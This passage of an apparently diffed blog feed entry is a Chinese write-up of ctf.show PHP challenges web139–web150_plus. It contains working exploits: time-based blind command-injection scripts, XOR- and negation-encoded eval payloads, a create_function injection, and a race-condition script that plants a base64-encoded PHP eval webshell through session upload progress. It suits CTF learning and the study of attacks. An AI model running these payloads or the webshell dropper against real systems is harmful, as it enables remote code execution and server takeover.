-&lt;p&gt;cut 命令用于显示每行从开头算起 num1 到 num2 的文字&lt;/p&gt;
-&lt;figure class=&#34;highlight txt&#34;&gt;&lt;figcaption data-lang=&#34;txt&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;-b ：以字节为单位进行分割。这些字节位置将忽略多字节字符边界，除非也指定了 -n 标志。&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;-c ：以字符为单位进行分割。&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;-d ：自定义分隔符，默认为制表符。&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;-f ：与-d一起使用，指定显示哪个区域。&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;-n ：取消分割多字节字符。仅和 -b 标志一起使用。如果字符的最后一个字节落在由 -b 标志的 List 参数指示的&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;范围之内，该字符将被写出；否则，该字符将被排除&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;这里配合 cut 可以将字符单个输出&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230217183827166.png&#34; alt=&#34;image-20230217183827166&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;通过 shell 语法延迟，将字符转换为时间信道&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230218121621350.png&#34; alt=&#34;image-20230218121621350&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;那么就可以做到类似时间盲注的效果，简单的整个 exp，找到存放 flag 的文件&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import requests
-import time
-import string
-
-str=string.digits+string.ascii_letters+&amp;quot;-_.&amp;quot;
-#rint(str)
-
-url=&amp;quot;http://f59ad576-2f1c-49a2-b14d-92df62c3edfa.challenge.ctf.show/?c=&amp;quot;
-flag=&amp;quot;&amp;quot;
-
-for i in range(1,10):
-    for j in range(1,20):
-        for s in str:
-            payload = &amp;quot;if [ `ls / -1|awk \&amp;quot;NR==&amp;#123;0&amp;#125;\&amp;quot; |cut -c &amp;#123;1&amp;#125;` == \&amp;quot;&amp;#123;2&amp;#125;\&amp;quot; ];then sleep 3;fi&amp;quot;.format(i,j,s)
-            payloadpro=url+payload
-            #print(payloadpro)
-            try:
-                requests.get(payloadpro,timeout=2.5)
-            except:
-                flag=flag+s
-                print(flag)
-                break
-    flag=flag+&amp;quot; &amp;quot;
-
-print(flag)
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230218175130501.png&#34; alt=&#34;image-20230218175130501&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;接下来将命令改一下拿到 flag&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import requests
-import time
-import string
-
-str=string.digits+string.ascii_letters+&amp;quot;-_.&amp;quot;
-#rint(str)
-
-url=&amp;quot;http://f59ad576-2f1c-49a2-b14d-92df62c3edfa.challenge.ctf.show/?c=&amp;quot;
-flag=&amp;quot;&amp;quot;
-
-for i in range(1,10):
-    for j in range(1,50):
-        for s in str:
-            payload = &amp;quot;if [ `cat /f149_15_h3r3|awk \&amp;quot;NR==&amp;#123;0&amp;#125;\&amp;quot; |cut -c &amp;#123;1&amp;#125;` == \&amp;quot;&amp;#123;2&amp;#125;\&amp;quot; ];then sleep 3;fi&amp;quot;.format(i,j,s)
-            payloadpro=url+payload
-            #print(payloadpro)
-            try:
-                requests.get(payloadpro,timeout=2.5)
-            except:
-                flag=flag+s
-                print(flag)
-                break
-    flag=flag+&amp;quot; &amp;quot;
-
-print(flag)
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230218175624322.png&#34; alt=&#34;image-20230218175624322&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;web140&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web140&#34;&gt;#&lt;/a&gt; web140&lt;/h2&gt;
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
-error_reporting(0);
-highlight_file(__FILE__);
-if(isset($_POST[&#39;f1&#39;]) &amp;amp;&amp;amp; isset($_POST[&#39;f2&#39;]))&amp;#123;
-    $f1 = (String)$_POST[&#39;f1&#39;];
-    $f2 = (String)$_POST[&#39;f2&#39;];
-    if(preg_match(&#39;/^[a-z0-9]+$/&#39;, $f1))&amp;#123;
-        if(preg_match(&#39;/^[a-z0-9]+$/&#39;, $f2))&amp;#123;
-            $code = eval(&amp;quot;return $f1($f2());&amp;quot;);
-            if(intval($code) == &#39;ctfshow&#39;)&amp;#123;
-                echo file_get_contents(&amp;quot;flag.php&amp;quot;);
-            &amp;#125;
-        &amp;#125;
-    &amp;#125;
-&amp;#125;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;最后一个 if 是一个弱类型比较，只要上面的值为 0 或者 false 或 NULL 的&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;post f1=usleep&amp;amp;f2=usleep
-post f1=gmdate&amp;amp;f2=gmdate
-post f1=intval&amp;amp;f2=intval
-post f1=system&amp;amp;f2=system
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;等等，很多函数都可以&lt;/p&gt;
-&lt;h2 id=&#34;web141&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web141&#34;&gt;#&lt;/a&gt; web141&lt;/h2&gt;
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
-highlight_file(__FILE__);
-if(isset($_GET[&#39;v1&#39;]) &amp;amp;&amp;amp; isset($_GET[&#39;v2&#39;]) &amp;amp;&amp;amp; isset($_GET[&#39;v3&#39;]))&amp;#123;
-    $v1 = (String)$_GET[&#39;v1&#39;];
-    $v2 = (String)$_GET[&#39;v2&#39;];
-    $v3 = (String)$_GET[&#39;v3&#39;];
-
-    if(is_numeric($v1) &amp;amp;&amp;amp; is_numeric($v2))&amp;#123;
-        if(preg_match(&#39;/^\W+$/&#39;, $v3))&amp;#123;
-            $code =  eval(&amp;quot;return $v1$v3$v2;&amp;quot;);
-            echo &amp;quot;$v1$v3$v2 = &amp;quot;.$code;
-        &amp;#125;
-    &amp;#125;
-&amp;#125;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;if (preg_match (&#39;/^\W+$/&#39;, $v3)) 这里只能使用符号，相当于无参 rce&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;v1=1&amp;amp;v2=2&amp;amp;v3=-(~%8C%86%8C%8B%9A%92)(~%93%8C);
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230218195950435.png&#34; alt=&#34;image-20230218195950435&#34; /&gt;&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;?v1=1&amp;amp;v2=2&amp;amp;v3=-(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%99%93%9E%98%D1%8F%97%8F);
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230218200028622.png&#34; alt=&#34;image-20230218200028622&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;web142&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web142&#34;&gt;#&lt;/a&gt; web142&lt;/h2&gt;
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
-error_reporting(0);
-highlight_file(__FILE__);
-if(isset($_GET[&#39;v1&#39;]))&amp;#123;
-    $v1 = (String)$_GET[&#39;v1&#39;];
-    if(is_numeric($v1))&amp;#123;
-        $d = (int)($v1 * 0x36d * 0x36d * 0x36d * 0x36d * 0x36d);
-        sleep($d);
-        echo file_get_contents(&amp;quot;flag.php&amp;quot;);
-    &amp;#125;
-&amp;#125;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;pre&gt;&lt;code&gt;?v1=0
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;果然是难度 0&lt;/p&gt;
-&lt;h2 id=&#34;web143&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web143&#34;&gt;#&lt;/a&gt; web143&lt;/h2&gt;
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
-highlight_file(__FILE__);
-if(isset($_GET[&#39;v1&#39;]) &amp;amp;&amp;amp; isset($_GET[&#39;v2&#39;]) &amp;amp;&amp;amp; isset($_GET[&#39;v3&#39;]))&amp;#123;
-    $v1 = (String)$_GET[&#39;v1&#39;];
-    $v2 = (String)$_GET[&#39;v2&#39;];
-    $v3 = (String)$_GET[&#39;v3&#39;];
-    if(is_numeric($v1) &amp;amp;&amp;amp; is_numeric($v2))&amp;#123;
-        if(preg_match(&#39;/[a-z]|[0-9]|\+|\-|\.|\_|\||\$|\&amp;#123;|\&amp;#125;|\~|\%|\&amp;amp;|\;/i&#39;, $v3))&amp;#123;
-                die(&#39;get out hacker!&#39;);
-        &amp;#125;
-        else&amp;#123;
-            $code =  eval(&amp;quot;return $v1$v3$v2;&amp;quot;);
-            echo &amp;quot;$v1$v3$v2 = &amp;quot;.$code;
-        &amp;#125;
-    &amp;#125;
-&amp;#125;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;和 web141 一样使用无参 rce，就是加上了一些限制，但是没有过滤 ^, 这里使异或绕过即可&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230220180025626.png&#34; alt=&#34;image-20230220180025626&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;web144&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web144&#34;&gt;#&lt;/a&gt; web144&lt;/h2&gt;
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
-highlight_file(__FILE__);
-if(isset($_GET[&#39;v1&#39;]) &amp;amp;&amp;amp; isset($_GET[&#39;v2&#39;]) &amp;amp;&amp;amp; isset($_GET[&#39;v3&#39;]))&amp;#123;
-    $v1 = (String)$_GET[&#39;v1&#39;];
-    $v2 = (String)$_GET[&#39;v2&#39;];
-    $v3 = (String)$_GET[&#39;v3&#39;];
-
-    if(is_numeric($v1) &amp;amp;&amp;amp; check($v3))&amp;#123;
-        if(preg_match(&#39;/^\W+$/&#39;, $v2))&amp;#123;
-            $code =  eval(&amp;quot;return $v1$v3$v2;&amp;quot;);
-            echo &amp;quot;$v1$v3$v2 = &amp;quot;.$code;
-        &amp;#125;
-    &amp;#125;
-&amp;#125;
-
-function check($str)&amp;#123;
-    return strlen($str)===1?true:false;
-&amp;#125;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;这里题目说是上一题的升级版，但是好像更简单？&lt;/p&gt;
-&lt;p&gt;v3 的长度唯一，然后再 v2rce&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230220180616767.png&#34; alt=&#34;image-20230220180616767&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;上面的 payload 接着用就行了&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230220180644671.png&#34; alt=&#34;image-20230220180644671&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;web145&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web145&#34;&gt;#&lt;/a&gt; web145&lt;/h2&gt;
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
-highlight_file(__FILE__);
-if(isset($_GET[&#39;v1&#39;]) &amp;amp;&amp;amp; isset($_GET[&#39;v2&#39;]) &amp;amp;&amp;amp; isset($_GET[&#39;v3&#39;]))&amp;#123;
-    $v1 = (String)$_GET[&#39;v1&#39;];
-    $v2 = (String)$_GET[&#39;v2&#39;];
-    $v3 = (String)$_GET[&#39;v3&#39;];
-    if(is_numeric($v1) &amp;amp;&amp;amp; is_numeric($v2))&amp;#123;
-        if(preg_match(&#39;/[a-z]|[0-9]|\@|\!|\+|\-|\.|\_|\$|\&amp;#125;|\%|\&amp;amp;|\;|\&amp;lt;|\&amp;gt;|\*|\/|\^|\#|\&amp;quot;/i&#39;, $v3))&amp;#123;
-                die(&#39;get out hacker!&#39;);
-        &amp;#125;
-        else&amp;#123;
-            $code =  eval(&amp;quot;return $v1$v3$v2;&amp;quot;);
-            echo &amp;quot;$v1$v3$v2 = &amp;quot;.$code;
-        &amp;#125;
-    &amp;#125;
-&amp;#125;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;emmmmm 加了一些限制但是好像没有过滤取反，接着用就行&lt;/p&gt;
-&lt;h2 id=&#34;web146&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web146&#34;&gt;#&lt;/a&gt; web146&lt;/h2&gt;
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
-highlight_file(__FILE__);
-if(isset($_GET[&#39;v1&#39;]) &amp;amp;&amp;amp; isset($_GET[&#39;v2&#39;]) &amp;amp;&amp;amp; isset($_GET[&#39;v3&#39;]))&amp;#123;
-    $v1 = (String)$_GET[&#39;v1&#39;];
-    $v2 = (String)$_GET[&#39;v2&#39;];
-    $v3 = (String)$_GET[&#39;v3&#39;];
-    if(is_numeric($v1) &amp;amp;&amp;amp; is_numeric($v2))&amp;#123;
-        if(preg_match(&#39;/[a-z]|[0-9]|\@|\!|\:|\+|\-|\.|\_|\$|\&amp;#125;|\%|\&amp;amp;|\;|\&amp;lt;|\&amp;gt;|\*|\/|\^|\#|\&amp;quot;/i&#39;, $v3))&amp;#123;
-                die(&#39;get out hacker!&#39;);
-        &amp;#125;
-        else&amp;#123;
-            $code =  eval(&amp;quot;return $v1$v3$v2;&amp;quot;);
-            echo &amp;quot;$v1$v3$v2 = &amp;quot;.$code;
-        &amp;#125;
-    &amp;#125;
-&amp;#125;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;开始我还在疑惑为啥题没改，才看到那些运算符都加入黑名单了，这里还能用的有 | 和三元运算符&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;?v1=1&amp;amp;v2=2&amp;amp;v3=|(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%99%93%9E%98%D1%8F%97%8F)|
-
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230220182206212.png&#34; alt=&#34;image-20230220182206212&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;web147&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web147&#34;&gt;#&lt;/a&gt; web147&lt;/h2&gt;
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
-highlight_file(__FILE__);
-
-if(isset($_POST[&#39;ctf&#39;]))&amp;#123;
-    $ctfshow = $_POST[&#39;ctf&#39;];
-    if(!preg_match(&#39;/^[a-z0-9_]*$/isD&#39;,$ctfshow)) &amp;#123;
-        $ctfshow(&#39;&#39;,$_GET[&#39;show&#39;]);
-    &amp;#125;
-
-&amp;#125;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;create_function 的代码注入，先看看官方文档怎么说&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230220182826525.png&#34; alt=&#34;image-20230220182826525&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;这里就正常使用 create_function 的代码注入，但是麻烦的是这个正则，这里使用 \ 可以绕过，php 里默认命名空间是 \，所有原生函数和类都在这个命名空间中。 普通调用一个函数，如果直接写函数名 function_name () 调用，调用的时候其实相当于写了一个相对路 径； 而如果写 \function_name () 这样调用函数，则其实是写了一个绝对路径。 如果你在其他 namespace 里调用系统类，就必须写绝对路径这种写法&lt;/p&gt;
-&lt;p&gt;那么剩下的就简单了，正常注入就行，} 闭合原来的函数，然后执行命令，然后再把多余的} 给注释掉就可以了&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230220185007527.png&#34; alt=&#34;image-20230220185007527&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230220184918100.png&#34; alt=&#34;image-20230220184918100&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;web148&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web148&#34;&gt;#&lt;/a&gt; web148&lt;/h2&gt;
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
-include &#39;flag.php&#39;;
-if(isset($_GET[&#39;code&#39;]))&amp;#123;
-    $code=$_GET[&#39;code&#39;];
-    if(preg_match(&amp;quot;/[A-Za-z0-9_\%\\|\~\&#39;\,\.\:\@\&amp;amp;\*\+\- ]+/&amp;quot;,$code))&amp;#123;
-        die(&amp;quot;error&amp;quot;);
-    &amp;#125;
-    @eval($code);
-&amp;#125;
-else&amp;#123;
-    highlight_file(__FILE__);
-&amp;#125;
-
-function get_ctfshow_fl0g()&amp;#123;
-    echo file_get_contents(&amp;quot;flag.php&amp;quot;);
-&amp;#125;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;这里看来只能使用异或了&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;?code=(&amp;quot;%0c%19%0c%5c%60%60&amp;quot;^&amp;quot;%7f%60%7f%28%05%0d&amp;quot;)(&amp;quot;%09%01%03%01%06%02&amp;quot;^&amp;quot;%7d%60%60%21%60%28&amp;quot;);
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230220190521659.png&#34; alt=&#34;image-20230220190521659&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;web149&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web149&#34;&gt;#&lt;/a&gt; web149&lt;/h2&gt;
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
-error_reporting(0);
-highlight_file(__FILE__);
-
-$files = scandir(&#39;./&#39;); 
-foreach($files as $file) &amp;#123;
-    if(is_file($file))&amp;#123;
-        if ($file !== &amp;quot;index.php&amp;quot;) &amp;#123;
-            unlink($file);
-        &amp;#125;
-    &amp;#125;
-&amp;#125;
-
-file_put_contents($_GET[&#39;ctf&#39;], $_POST[&#39;show&#39;]);
-
-$files = scandir(&#39;./&#39;); 
-foreach($files as $file) &amp;#123;
-    if(is_file($file))&amp;#123;
-        if ($file !== &amp;quot;index.php&amp;quot;) &amp;#123;
-            unlink($file);
-        &amp;#125;
-    &amp;#125;
-&amp;#125;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;很简单的条件竞争没啥好说的&lt;/p&gt;
-&lt;h2 id=&#34;web150&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web150&#34;&gt;#&lt;/a&gt; web150&lt;/h2&gt;
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
-include(&amp;quot;flag.php&amp;quot;);
-error_reporting(0);
-highlight_file(__FILE__);
-
-class CTFSHOW&amp;#123;
-    private $username;
-    private $password;
-    private $vip;
-    private $secret;
-
-    function __construct()&amp;#123;
-        $this-&amp;gt;vip = 0;
-        $this-&amp;gt;secret = $flag;
-    &amp;#125;
-
-    function __destruct()&amp;#123;
-        echo $this-&amp;gt;secret;
-    &amp;#125;
-
-    public function isVIP()&amp;#123;
-        return $this-&amp;gt;vip?TRUE:FALSE;
-        &amp;#125;
-    &amp;#125;
-
-    function __autoload($class)&amp;#123;
-        if(isset($class))&amp;#123;
-            $class();
-    &amp;#125;
-&amp;#125;
-
-#过滤字符
-$key = $_SERVER[&#39;QUERY_STRING&#39;];
-if(preg_match(&#39;/\_| |\[|\]|\?/&#39;, $key))&amp;#123;
-    die(&amp;quot;error&amp;quot;);
-&amp;#125;
-$ctf = $_POST[&#39;ctf&#39;];
-extract($_GET);
-if(class_exists($__CTFSHOW__))&amp;#123;
-    echo &amp;quot;class is exists!&amp;quot;;
-&amp;#125;
-
-if($isVIP &amp;amp;&amp;amp; strrpos($ctf, &amp;quot;:&amp;quot;)===FALSE)&amp;#123;
-    include($ctf);
-&amp;#125;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;这里的 include 文件包含没啥限制，任意文件包含，看到往上的师傅说可以日志包含，果然强但是我没能成功复现，包含 session 文件还是可以的&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230220202411298.png&#34; alt=&#34;image-20230220202411298&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;web150_plus&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web150_plus&#34;&gt;#&lt;/a&gt; web150_plus&lt;/h2&gt;
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
-include(&amp;quot;flag.php&amp;quot;);
-error_reporting(0);
-highlight_file(__FILE__);
-
-class CTFSHOW&amp;#123;
-    private $username;
-    private $password;
-    private $vip;
-    private $secret;
-
-    function __construct()&amp;#123;
-        $this-&amp;gt;vip = 0;
-        $this-&amp;gt;secret = $flag;
-    &amp;#125;
-
-    function __destruct()&amp;#123;
-        echo $this-&amp;gt;secret;
-    &amp;#125;
-
-    public function isVIP()&amp;#123;
-        return $this-&amp;gt;vip?TRUE:FALSE;
-        &amp;#125;
-    &amp;#125;
-
-    function __autoload($class)&amp;#123;
-        if(isset($class))&amp;#123;
-            $class();
-    &amp;#125;
-&amp;#125;
-
-#过滤字符
-$key = $_SERVER[&#39;QUERY_STRING&#39;];
-if(preg_match(&#39;/\_| |\[|\]|\?/&#39;, $key))&amp;#123;
-    die(&amp;quot;error&amp;quot;);
-&amp;#125;
-$ctf = $_POST[&#39;ctf&#39;];
-extract($_GET);
-if(class_exists($__CTFSHOW__))&amp;#123;
-    echo &amp;quot;class is exists!&amp;quot;;
-&amp;#125;
-
-if($isVIP &amp;amp;&amp;amp; strrpos($ctf, &amp;quot;:&amp;quot;)===FALSE &amp;amp;&amp;amp; strrpos($ctf,&amp;quot;log&amp;quot;)===FALSE)&amp;#123;
-    include($ctf);
-&amp;#125;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;这里多加了一个 log，但是好像没啥太大影响&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;这个题一点点小坑__autoload()函数不是类里面的
-__autoload — 尝试加载未定义的类
-最后构造?..CTFSHOW..=phpinfo就可以看到phpinfo信息啦
-原因是..CTFSHOW..解析变量成__CTFSHOW__然后进行了变量覆盖，因为CTFSHOW是类就会使用
-__autoload()函数方法，去加载，因为等于phpinfo就会去加载phpinfo
-接下来就去getshell啦
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;最后整个脚本&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;
-import io
-import requests
-import threading
-url = &#39;http://3b26945b-f942-4c30-8a18-9c796b82a7cc.challenge.ctf.show/?isVIP=1&#39;
-
-
-event = threading.Event()
-
-
-def write(session):
-    data = &amp;#123;
-        &#39;PHP_SESSION_UPLOAD_PROGRESS&#39;: &#39;aaaaaa&amp;lt;?php file_put_contents(&amp;quot;/var/www/html/s.php&amp;quot;, base64_decode(&amp;quot;PD9waHAgZXZhbCgkX1BPU1RbMV0pOyA/Pg==&amp;quot;));?&amp;gt;&#39;
-    &amp;#125;
-    while True:
-        if event.is_set():
-            return
-        f = io.BytesIO(b&#39;a&#39; * 1024 * 10)
-        _ = session.post(url,cookies=&amp;#123;&#39;PHPSESSID&#39;: &#39;down&#39;&amp;#125;, data=data, files=&amp;#123;&#39;file&#39;: (&#39;verysafe.txt&#39;, f)&amp;#125;)
-
-
-def read(session):
-    while True:
-        if event.is_set():
-            return
-        response = session.post(url, data=&amp;#123;&amp;quot;ctf&amp;quot;: &amp;quot;/tmp/sess_down&amp;quot;&amp;#125;)
-        if &#39;aaaaaa&#39; in response.text:
-            print(response.text)
-            event.set()
-        else:
-            print(&#39;retry&#39;)
-
-
-if __name__ == &#39;__main__&#39;:
-    session = requests.session()
-    for i in range(30):
-        threading.Thread(target=write, args=(session,)).start()
-    for i in range(30):
-        threading.Thread(target=read, args=(session,)).start()
-    event.wait()
-&lt;/code&gt;&lt;/pre&gt;
-</content>
-        <category term="CTFshow" scheme="https://blog.xcu.icu/categories/CTFshow/" />
-        <category term="php特性" scheme="https://blog.xcu.icu/tags/php%E7%89%B9%E6%80%A7/" />
-        <updated>2023-02-15T04:00:00.000Z</updated>
     </entry>
 </feed>
